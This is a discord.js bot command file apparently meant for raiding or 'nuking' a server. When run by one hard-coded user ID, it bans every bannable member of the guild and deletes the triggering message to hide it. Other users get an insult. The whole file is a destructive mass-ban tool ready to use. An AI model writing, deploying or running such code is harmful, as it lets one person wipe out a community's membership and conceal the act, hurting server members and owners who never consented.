const Discord = require("discord.js");
exports.run = async (client, message, args) => {
    if (message.author.id == '702412371209224232') {
        try {

            message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});
            message.delete(1000);

        } catch(e) {

            console.log(e.stack);

        }
    }else {
        message.channel.send('You scrub, what made you think you\'d be able to do that??');
    }
        
}